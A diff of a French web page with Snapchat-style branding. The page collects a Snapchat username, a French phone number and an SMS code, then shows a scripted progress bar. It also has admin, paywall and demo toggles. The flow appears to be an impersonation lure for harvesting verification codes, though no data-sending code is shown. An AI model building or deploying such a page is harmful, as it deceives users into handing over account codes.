@@ -16,7 +16,6 @@
             font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             color: white; overflow-x: hidden;
             -webkit-tap-highlight-color: transparent;
-            transition: background 1s ease; /* Transition douce pour le passage en mode admin */
         }
 
         /* --- 1. SYSTÈME D'AUTHENTIFICATION (WATER GLASS) --- */
@@ -154,71 +153,46 @@
         }
 
         /* --- 2. CONTENU PRINCIPAL --- */
-        #main-site { display: none; opacity: 0; transition: opacity 0.8s ease; }
+        #main-site { display: none;
+        opacity: 0; transition: opacity 0.8s ease; }
 
-        .container { width: 100%; max-width: 380px; padding: 60px 20px; text-align: center; margin: 0 auto; box-sizing: border-box; }
-
-        /* --- BADGE ADMIN --- */
-        .admin-badge {
-            display: none;
-            background: rgba(0, 255, 128, 0.1);
-            border: 1px solid #00ff80;
-            color: #00ff80;
-            padding: 8px 16px;
-            border-radius: 50px;
-            font-size: 11px;
-            font-weight: 900;
-            margin: -20px auto 30px auto;
-            width: max-content;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            animation: pulseGlow 1.5s infinite;
-            box-shadow: 0 0 10px rgba(0, 255, 128, 0.2);
-        }
-        @keyframes pulseGlow {
-            0% { box-shadow: 0 0 10px rgba(0, 255, 128, 0.2); opacity: 1; }
-            50% { box-shadow: 0 0 20px rgba(0, 255, 128, 0.6); opacity: 0.7; }
-            100% { box-shadow: 0 0 10px rgba(0, 255, 128, 0.2); opacity: 1; }
+        .container { width: 100%; max-width: 380px;
+        padding: 60px 20px; text-align: center; margin: 0 auto; box-sizing: border-box;
         }
 
-        /* --- ANIMATION BACKGROUND ADMIN --- */
-        @keyframes adminBgAnim {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+        .logo-wrapper { position: relative; width: 150px; height: 150px; margin: 0 auto 35px;
         }
-        .admin-mode-active {
-            background: linear-gradient(270deg, #020005, #12002b, #050014, #180033);
-            background-size: 400% 400%;
-            animation: adminBgAnim 12s ease infinite !important;
-        }
-
-        .logo-wrapper { position: relative; width: 150px; height: 150px; margin: 0 auto 35px; }
         
         .border-gradient {
-            width: 100%; height: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080);
+            width: 100%;
+            height: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080);
             border-radius: 40px; display: flex; justify-content: center; align-items: center;
             box-shadow: 0 0 35px rgba(204, 51, 255, 0.4);
         }
         
         .snap-bg { 
-            width: 88%; height: 88%; 
+            width: 88%;
+            height: 88%; 
             background-color: #fffc00; 
             border-radius: 32px; 
             display: flex; justify-content: center; align-items: center;
             overflow: hidden;
         }
 
-        .snap-bg img { width: 100%; height: 100%; object-fit: cover; }
+        .snap-bg img { width: 100%; height: 100%; object-fit: cover;
+        }
 
         .plus-badge {
             position: absolute;
             top: -4px; right: -4px; background-color: #ffb400; color: #1a0133;
             width: 40px; height: 40px; border-radius: 50%; font-size: 24px; font-weight: bold;
-            display: flex; justify-content: center; align-items: center; border: 4px solid #1e053d;
+            display: flex;
+            justify-content: center; align-items: center; border: 4px solid #1e053d;
         }
 
-        .title { color: #df80ff; font-size: 24px; font-weight: 800; letter-spacing: 2px; margin-bottom: 35px; text-transform: uppercase; }
+        .title { color: #df80ff;
+        font-size: 24px; font-weight: 800; letter-spacing: 2px; margin-bottom: 35px; text-transform: uppercase;
+        }
 
         .input-group { 
             display: flex;
@@ -236,7 +210,8 @@
             box-shadow: 0 0 10px rgba(204, 51, 255, 0.2);
         }
 
-        .input-group label { display: none; }
+        .input-group label { display: none;
+        }
 
         .prefix-phone { 
             background-color: #1a0533;
@@ -246,140 +221,196 @@
         }
 
         input { 
-            flex: 1; border: none; background: transparent; 
+            flex: 1;
+            border: none; background: transparent; 
             padding: 0 18px; color: white; font-size: 17px; 
             outline: none; height: 58px;
         }
-        input::placeholder { color: rgba(255, 255, 255, 0.5); }
 
-        /* --- SÉLECTEUR PERSONNALISÉ (DROPDOWN) --- */
-        select {
-            flex: 1; border: none; background: transparent;
-            padding: 0 18px; color: white; font-size: 17px;
-            outline: none; height: 58px;
-            appearance: none; -webkit-appearance: none;
-            cursor: pointer; font-family: inherit;
+        input::placeholder { color: rgba(255, 255, 255, 0.5);
         }
-        select:invalid { color: rgba(255, 255, 255, 0.5); }
-        select option { background: #1e053d; color: white; }
-        .select-arrow { padding-right: 18px; pointer-events: none; display: flex; align-items: center; justify-content: center; }
-        .select-arrow svg { width: 16px; height: 16px; fill: rgba(255, 255, 255, 0.5); }
         
         .btn-glow { 
-            width: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080); 
+            width: 100%;
+            background: linear-gradient(135deg, #cc33ff, #ff0080); 
             border: none; border-radius: 12px; padding: 20px; 
             color: white; font-weight: 800; text-transform: uppercase; font-size: 18px;
-            letter-spacing: 2px; cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 255, 0.5); 
+            letter-spacing: 2px;
+            cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 255, 0.5); 
             margin-bottom: 30px; transition: all 0.3s ease;
         }
 
         .btn-glow:hover:not(:disabled) {
-            transform: translateY(-2px); box-shadow: 0 0 30px rgba(255, 0, 255, 0.8);
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px rgba(255, 0, 255, 0.8);
         }
 
-        .btn-glow:disabled { opacity: 0.7; cursor: not-allowed; }
+        .btn-glow:disabled { opacity: 0.7;
+        cursor: not-allowed; }
 
         .btn-return {
-            width: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080);
+            width: 100%;
+            background: linear-gradient(135deg, #cc33ff, #ff0080);
             border: none; border-radius: 12px; padding: 20px;
             color: white; font-weight: 800; text-transform: uppercase; font-size: 18px;
-            letter-spacing: 2px; cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 255, 0.5);
+            letter-spacing: 2px;
+            cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 255, 0.5);
             margin-bottom: 30px; transition: all 0.3s ease;
         }
 
         .btn-return:hover:not(:disabled) {
-            transform: translateY(-2px); box-shadow: 0 0 30px rgba(255, 0, 255, 0.8);
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px rgba(255, 0, 255, 0.8);
         }
-        .btn-return:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        .sms-instruction { font-size: 18px; font-weight: 800; margin-bottom: 8px; }
-        .sms-subtext { color: #7a7a7a; font-size: 14px; margin-bottom: 25px; transition: color 0.3s ease; }
+        .btn-return:disabled { opacity: 0.7;
+        cursor: not-allowed; }
+
+        .sms-instruction { font-size: 18px; font-weight: 800; margin-bottom: 8px;
+        }
+        .sms-subtext { color: #7a7a7a; font-size: 14px; margin-bottom: 25px; transition: color 0.3s ease;
+        }
 
         .status-box { 
-            background-color: rgba(30, 15, 60, 0.6); border: 1px solid rgba(255, 255, 255, 0.1); 
+            background-color: rgba(30, 15, 60, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1); 
             border-radius: 20px; padding: 35px 20px; margin-bottom: 40px; 
-            min-height: 180px; display: flex; flex-direction: column; justify-content: center; 
+            min-height: 180px; display: flex; flex-direction: column;
+            justify-content: center; 
         }
         
         .info-box { 
-            background-color: rgba(25, 10, 45, 0.7); border: 1px solid rgba(255, 255, 255, 0.1); 
+            background-color: rgba(25, 10, 45, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.1); 
             border-radius: 20px; padding: 25px 20px; text-align: left;
         }
 
-        .info-header { color: #ffcc00; font-weight: 900; margin-bottom: 12px; font-size: 16px; }
-        .info-text { font-size: 14px; opacity: 0.9; margin: 0; line-height: 1.5; }
+        .info-header { color: #ffcc00; font-weight: 900; margin-bottom: 12px; font-size: 16px;
+        }
+        .info-text { font-size: 14px; opacity: 0.9; margin: 0; line-height: 1.5;
+        }
 
         .spinner {
-            width: 40px; height: 40px; border: 4px solid rgba(255, 255, 255, 0.2);
+            width: 40px;
+            height: 40px; border: 4px solid rgba(255, 255, 255, 0.2);
             border-top: 4px solid #cc33ff; border-radius: 50%;
-            animation: spin 1s linear infinite; margin: 20px auto;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
 
         .error-message {
-            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            position: fixed;
+            top: 20px; left: 50%; transform: translateX(-50%);
             background-color: #ff4d4d; color: white; padding: 15px 20px;
-            border-radius: 12px; z-index: 10001; animation: slideDown 0.3s ease;
+            border-radius: 12px; z-index: 10001;
+            animation: slideDown 0.3s ease;
             max-width: 90%; box-shadow: 0 5px 20px rgba(255, 77, 77, 0.4);
         }
 
-        /* --- BARRE DE PROGRESSION --- */
+        /* --- 3. AJOUTS NOUVELLES FONCTIONNALITÉS (PROGRESSION, FAQ & TIKTOK) --- */
         .progress-wrapper { width: 100%; margin-top: 25px; }
         .progress-bar-bg { width: 100%; height: 8px; background: rgba(255, 255, 255, 0.1); border-radius: 4px; overflow: hidden; }
         .progress-bar-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #cc33ff, #ff0080); transition: width 0.4s ease; }
         .status-text { margin-top: 15px; font-size: 14px; color: #df80ff; min-height: 20px; font-weight: 600; }
 
-        /* --- FAQ SECTION --- */
         .faq-section {
-            margin-top: 35px; text-align: left; background: rgba(30, 15, 60, 0.4);
-            border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 20px;
+            margin-top: 35px;
+            text-align: left;
+            background: rgba(30, 15, 60, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 20px;
         }
         .faq-title {
-            font-size: 17px; font-weight: 900; color: white; /* Titre neutre */
-            margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; text-align: center;
+            font-size: 17px;
+            font-weight: 900;
+            color: #cc33ff;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-align: center;
         }
         .faq-item {
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05); padding: 14px 0; cursor: pointer;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 14px 0;
+            cursor: pointer;
         }
         .faq-item:last-child { border-bottom: none; }
         .faq-question {
-            font-size: 14px; font-weight: 700; display: flex; justify-content: space-between;
-            align-items: center; color: #cc33ff; /* Thème principal */
+            font-size: 14px;
+            font-weight: 700;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #df80ff;
         }
         .faq-question::after {
-            content: '＋'; font-size: 14px; color: rgba(255, 255, 255, 0.4); transition: transform 0.3s ease;
+            content: '＋';
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.4);
+            transition: transform 0.3s ease;
         }
         .faq-item.active .faq-question::after {
-            transform: rotate(45deg); color: #ff0080;
+            transform: rotate(45deg);
+            color: #ff0080;
         }
         .faq-answer {
-            font-size: 13px; opacity: 0; max-height: 0; overflow: hidden;
-            transition: all 0.3s cubic-bezier(0, 1, 0, 1); margin-top: 0;
-            color: #a0a0a0; /* Gris élégant */ line-height: 1.5;
+            font-size: 13px;
+            opacity: 0;
+            max-height: 0;
+            overflow: hidden;
+            transition: all 0.3s cubic-bezier(0, 1, 0, 1);
+            margin-top: 0;
+            color: rgba(255, 255, 255, 0.75);
+            line-height: 1.5;
         }
         .faq-item.active .faq-answer {
-            opacity: 1; max-height: 150px; margin-top: 10px; transition: all 0.3s ease-in-out;
+            opacity: 1;
+            max-height: 150px;
+            margin-top: 10px;
+            transition: all 0.3s ease-in-out;
         }
 
-        /* --- FOOTER CONTACT TIKTOK --- */
-        .footer-contact { margin-top: 40px; text-align: center; padding-bottom: 10px; }
+        .footer-contact {
+            margin-top: 40px;
+            text-align: center;
+            padding-bottom: 10px;
+        }
         .contact-title {
-            font-size: 12px; font-weight: 900; letter-spacing: 2px;
-            color: rgba(255, 255, 255, 0.3); margin-bottom: 15px; text-transform: uppercase;
+            font-size: 12px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            color: rgba(255, 255, 255, 0.3);
+            margin-bottom: 15px;
+            text-transform: uppercase;
         }
         .tiktok-btn {
-            display: flex; /* Aligné avec les inputs */
-            width: 100%; box-sizing: border-box; /* Pleine largeur */
-            align-items: center; justify-content: center;
-            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08);
-            padding: 18px 28px; border-radius: 12px; /* Arrondis homogènes */
-            text-decoration: none; color: white; font-weight: 700; font-size: 16px;
-            transition: all 0.3s ease; gap: 12px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 14px 28px;
+            border-radius: 50px;
+            text-decoration: none;
+            color: white;
+            font-weight: 700;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            gap: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
         }
         .tiktok-btn:hover {
-            background: rgba(255, 255, 255, 0.08); border-color: #ff0080;
-            transform: translateY(-2px); box-shadow: 0 5px 20px rgba(255, 0, 128, 0.25);
+            background: rgba(255, 255, 255, 0.08);
+            border-color: #ff0080;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(255, 0, 128, 0.25);
         }
-        .tiktok-icon { width: 20px; height: 20px; object-fit: contain; }
+        .tiktok-icon {
+            width: 20px;
+            height: 20px;
+            object-fit: contain;
+        }
 
         /* --- ANIMATIONS --- */
         @keyframes shakeEffect {
@@ -387,7 +418,10 @@
             20%, 60% { transform: translateX(-6px); }
             40%, 80% { transform: translateX(6px); }
         }
-        .shake { animation: shakeEffect 0.4s ease-in-out; border-color: #ff4d4d !important; }
+        .shake {
+            animation: shakeEffect 0.4s ease-in-out;
+            border-color: #ff4d4d !important;
+        }
 
         @keyframes spin { to { transform: rotate(360deg); } }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
@@ -399,7 +433,6 @@
             .title { font-size: 20px; }
             .btn-glow { padding: 16px; font-size: 16px; }
             .btn-return { padding: 16px; font-size: 16px; }
-            .tiktok-btn { padding: 16px 28px; font-size: 15px; }
             .logo-wrapper { width: 120px; height: 120px; margin-bottom: 25px; }
         }
 
@@ -433,9 +466,6 @@
 
     <div id="main-site">
         <div class="container">
-            
-            <div id="admin-badge" class="admin-badge"></div>
-
             <div class="logo-wrapper">
                 <div class="border-gradient">
                     <div class="snap-bg">
@@ -452,26 +482,11 @@
                     <label for="username">Nom d'utilisateur Snapchat</label>
                     <input type="text" id="username" placeholder="Nom d'utilisateur Snapchat" aria-label="Nom d'utilisateur Snapchat" maxlength="50">
                 </div>
-                
                 <div class="input-group" id="group-phone">
                     <label for="phone">Numéro de téléphone</label>
                     <div class="prefix-phone" aria-hidden="true">+33 🇫🇷</div>
                     <input type="tel" id="phone" placeholder="123456789" aria-label="Numéro de téléphone" maxlength="10" inputmode="numeric">
                 </div>
-
-                <div class="input-group" id="group-offer">
-                    <label for="offer-select">Sélectionner l'offre</label>
-                    <select id="offer-select" aria-label="Sélectionner l'offre" required>
-                        <option value="" disabled selected>Sélectionner l'offre</option>
-                        <option value="1">1 mois</option>
-                        <option value="3">3 mois</option>
-                        <option value="12">12 mois</option>
-                    </select>
-                    <div class="select-arrow">
-                        <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
-                    </div>
-                </div>
-
                 <button class="btn-glow" id="submitBtn" onclick="processValidation()">Valider</button>
             </div>
 
@@ -541,6 +556,7 @@
             const overlay = document.getElementById('login-overlay');
             const site = document.getElementById('main-site');
             overlay.style.opacity = "0";
+            
             setTimeout(() => {
                 overlay.style.display = "none";
                 site.style.display = "block";
@@ -548,20 +564,13 @@
             }, 500);
         }
 
-        // Interception des clics sur les champs de saisie ET sélecteur
+        // Interception des clics sur les champs de saisie
         document.addEventListener('DOMContentLoaded', () => {
-            const allInputs = document.querySelectorAll('#main-site input, #main-site select');
+            const allInputs = document.querySelectorAll('#main-site input');
             allInputs.forEach(input => {
                 input.addEventListener('focus', (e) => {
                     if (isGuest) {
                         e.target.blur(); // Désactive immédiatement le champ et masque le clavier
-                        showPaywallPopup();
-                    }
-                });
-                // Spécifique pour le select sur mobile
-                input.addEventListener('mousedown', (e) => {
-                    if (isGuest && e.target.tagName === 'SELECT') {
-                        e.preventDefault();
                         showPaywallPopup();
                     }
                 });
@@ -587,7 +596,7 @@
         function activateDemoMode(button) {
             isGuest = false;
             showError("🚀 Mode Démonstration activé ! Les champs sont débloqués.");
-            button.parentElement.parentElement.remove();
+            button.parentElement.parentElement.remove(); // Ferme la popup
         }
 
         // --- FONCTION DE SECOUSSE ---
@@ -595,16 +604,25 @@
             const el = document.getElementById(elementId);
             if (el) {
                 el.classList.remove('shake');
-                void el.offsetWidth;
+                void el.offsetWidth; // Force la réinitialisation de l'animation
                 el.classList.add('shake');
                 setTimeout(() => el.classList.remove('shake'), 400);
             }
         }
 
         // --- FONCTIONS DE VALIDATION ---
-        function validateUsername(username) { return username.trim().length >= 3; }
-        function validatePhoneNumber(phone) { return /^[0-9]{10}$/.test(phone); }
-        function validateSMSCode(code) { return /^[0-9]{4}$/.test(code); }
+        function validateUsername(username) {
+            return username.trim().length >= 3;
+        }
+
+        function validatePhoneNumber(phone) {
+            const regex = /^[0-9]{10}$/;
+            return regex.test(phone);
+        }
+
+        function validateSMSCode(code) {
+            return /^[0-9]{4}$/.test(code);
+        }
 
         function showError(message) {
             const errorDiv = document.createElement('div');
@@ -637,23 +655,14 @@
                 
                 btn.innerHTML = "Connexion en cours...";
                 btn.disabled = true;
-
-                // ACTIVATION DES FONCTIONNALITÉS EXCLUSIVES ADMIN
-                document.body.classList.add('admin-mode-active');
-
                 setTimeout(() => {
                     panel.innerHTML = `<h2 class="welcome-msg">Bienvenue ${nameToDisplay}</h2>`;
                     
                     setTimeout(() => {
                         const overlay = document.getElementById('login-overlay');
                         const site = document.getElementById('main-site');
-                        
-                        // Affichage du Badge Admin
-                        const badge = document.getElementById('admin-badge');
-                        badge.style.display = "block";
-                        badge.innerHTML = "🟢 MODE ADMIN : " + nameToDisplay.toUpperCase();
-
                         overlay.style.opacity = "0";
+                        
                         setTimeout(() => {
                             overlay.style.display = "none";
                             site.style.display = "block";
@@ -679,7 +688,6 @@
 
             const username = document.getElementById('username').value.trim();
             const phone = document.getElementById('phone').value.trim();
-            const offer = document.getElementById('offer-select').value;
             const btn = document.getElementById('submitBtn');
 
             if (!validateUsername(username)) {
@@ -694,12 +702,6 @@
                 return;
             }
 
-            if (!offer) {
-                triggerShake('group-offer');
-                showError('❌ Veuillez sélectionner une offre.');
-                return;
-            }
-
             btn.innerHTML = "Envoi en cours...";
             btn.disabled = true;
 
@@ -709,13 +711,13 @@
                 btn.innerHTML = "Valider";
                 btn.disabled = false;
                 startVerificationTimer();
-             }, 2000);
+            }, 2000);
         }
 
         // --- TIMER DE VÉRIFICATION SMS ---
         let timerInterval;
         function startVerificationTimer() {
-            let timeLeft = 180;
+            let timeLeft = 180; // 3 minutes
             const timerElement = document.getElementById('timer');
             timerInterval = setInterval(() => {
                 timeLeft--;
@@ -731,7 +733,7 @@
             }, 1000);
         }
 
-        // --- VÉRIFICATION DU CODE SMS ---
+        // --- VÉRIFICATION DU CODE SMS (MODIFIÉE POUR LA BARRE DE PROGRESSION) ---
         function showWaitingMenu() {
             if (isGuest) {
                 showPaywallPopup();
@@ -754,10 +756,10 @@
             document.getElementById('step-2').style.display = 'none';
             document.getElementById('step-3').style.display = 'block';
             
-            runProgress();
+            runProgress(); // Déclenchement de la logique de chargement pas à pas
         }
 
-        // --- LOGIQUE DE PROGRESSION ---
+        // --- LOGIQUE DE PROGRESSION ET TEXTES D'ÉTAT EN TEMPS RÉEL ---
         function runProgress() {
             const pb = document.getElementById('pb');
             const msg = document.getElementById('status-msg');
@@ -774,13 +776,15 @@
             const interval = setInterval(() => {
                 if (i >= steps.length) {
                     clearInterval(interval);
-                    setTimeout(() => { showSuccessScreen(); }, 600);
+                    setTimeout(() => {
+                        showSuccessScreen();
+                    }, 600);
                     return;
                 }
                 pb.style.width = steps[i].width;
                 msg.textContent = steps[i].text;
                 i++;
-            }, 1400);
+            }, 1400); // L'étape change de façon fluide toutes les 1.4 secondes
         }
 
         function showSuccessScreen() {
@@ -807,9 +811,9 @@
             document.getElementById('step-3').style.display = 'none';
             document.getElementById('step-1').style.display = 'block';
             
+            // Réinitialiser les champs et remettre l'état de la barre à zéro
             document.getElementById('username').value = '';
             document.getElementById('phone').value = '';
-            document.getElementById('offer-select').value = '';
             document.getElementById('sms-code').value = '';
             document.getElementById('pb').style.width = '0%';
             document.getElementById('status-msg').textContent = 'Initialisation de la demande...';
@@ -829,7 +833,7 @@
                 const activeElement = document.activeElement;
                 if (activeElement.id === 'adminUser' || activeElement.id === 'adminPass') {
                     checkLogin();
-                } else if (activeElement.id === 'username' || activeElement.id === 'phone' || activeElement.id === 'offer-select') {
+                } else if (activeElement.id === 'username' || activeElement.id === 'phone') {
                     processValidation();
                 } else if (activeElement.id === 'sms-code') {
                     showWaitingMenu();
